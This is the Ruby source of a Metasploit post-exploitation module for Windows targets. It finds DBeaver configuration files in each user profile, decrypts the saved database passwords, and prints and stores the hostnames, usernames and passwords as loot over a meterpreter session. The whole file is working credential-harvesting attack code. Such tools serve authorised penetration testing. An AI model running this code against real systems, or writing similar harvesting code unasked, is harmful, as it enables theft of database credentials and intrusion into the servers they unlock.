##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# @blurbdust based this code off of https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
# and https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/enum_ms_product_keys.rb
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Rex::Parser::Dbeaver

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Dbeaver Passwords',
        'Description' => %q{
          This module will determine if Dbeaver is installed on the target system and, if it is, it will try to
          dump all saved session information from the target. The passwords for these saved sessions will then be decrypted
          where possible.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://blog.kali-team.cn/Metasploit-dbeaver-9f42e26241c94ba785dce5f1e69697aa' ]
        ],
        'Author' => ['Kali-Team <kali-team[at]qq.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options(
      [
        OptString.new('XML_FILE_PATH', [ false, 'Specifies the .dbeaver-data-sources.xml file path for Dbeaver']),
        OptString.new('JSON_DIR_PATH', [ false, 'Specifies the json directory path for Dbeaver']),
      ]
    )
  end

  def print_and_save(all_result)
    pw_tbl = Rex::Text::Table.new(
      'Header' => 'Dbeaver Password',
      'Columns' => [
        'Name',
        'Protocol',
        'Hostname',
        'Port',
        'Username',
        'Password',
        'DB',
        'URI',
        'Type',
      ]
    )
    all_result.each do |item|
      item.each do |_key, value|
        pw_tbl << value.values
      end
    end
    if pw_tbl.rows.count > 0
      path = store_loot('host.dbeaver', 'text/plain', session, pw_tbl, 'dbeaver.txt', 'Dbeaver Password')
      print_good("Passwords stored in: #{path}")
      print_good(pw_tbl.to_s)
    end
  end

  def parse_json_dir(json_dir)
    some_result = []
    credentials_config = File.join(json_dir, 'credentials-config.json')
    data_sources = File.join(json_dir, 'data-sources.json')
    begin
      if file_exist?(credentials_config) && file_exist?(data_sources)
        credentials_config_data = read_file(credentials_config) || ''
        data_sources_data = read_file(data_sources) || ''
        print_error('The file could not be read') if data_sources_data.empty? || credentials_config_data.empty?
        credentials_config_loot_path = store_loot('dbeaver.creds', 'text/json', session, credentials_config_data, credentials_config)
        data_sources_loot_path = store_loot('dbeaver.creds', 'text/json', session, data_sources_data, data_sources)
        print_good("dbeaver credentials-config.json saved to #{credentials_config_loot_path}")
        print_good("dbeaver data-sources.json saved to #{data_sources_loot_path}")
        some_result << parse_data_sources(data_sources_data, credentials_config_data)
        print_status("Finished processing #{json_dir}")
      end
    rescue ::JSON::ParserError
      print_error("The file #{json_dir} either could not be read or does not exist")
    end
    return some_result
  end

  def parse_xml_file(fullpath)
    some_result = []
    begin
      if file_exist?(fullpath)
        file_data = read_file(fullpath) || ''
        print_error("The file #{fullpath} could not be read") if file_data.empty?
        loot_path = store_loot('dbeaver.creds', 'text/xml', session, file_data, fullpath)
        print_good("dbeaver .dbeaver-data-sources.xml saved to #{loot_path}")
        result = parse_data_sources_xml(file_data)
        if !result.empty?
          some_result << result
        end
        print_status("Finished processing #{fullpath}")
      end
    rescue Rex::Post::Meterpreter::RequestError
      print_error("The file #{fullpath} either could not be read or does not exist")
    end
    return some_result
  end

  def run
    profiles = grab_user_profiles
    all_result = []
    xml_path = ''
    json_path = ''
    if datastore['XML_FILE_PATH'].present?
      xml_path = datastore['XML_FILE_PATH']
      print_status("Looking for #{xml_path}")
      all_result += parse_xml_file(xml_path)
    end
    if datastore['JSON_DIR_PATH'].present?
      json_path = datastore['JSON_DIR_PATH']
      print_status("Looking for JSON files in #{json_path}")
      all_result += parse_json_dir(json_path)
    end
    if xml_path.empty? && json_path.empty?
      profiles.each do |user_profiles|
        next if user_profiles['SID'].nil?

        print_status("Gather Dbeaver Passwords on #{user_profiles['UserName']}")
        all_result += parse_xml_file(user_profiles['ProfileDir'] + '\.dbeaver4\General\.dbeaver-data-sources.xml')
        all_result += parse_xml_file(user_profiles['AppData'] + '\DBeaverData\workspace6\General\.dbeaver-data-sources.xml')
        all_result += parse_json_dir(user_profiles['AppData'] + '\DBeaverData\workspace6\General\.dbeaver')
      end
    end
    print_and_save(all_result)
  end
end
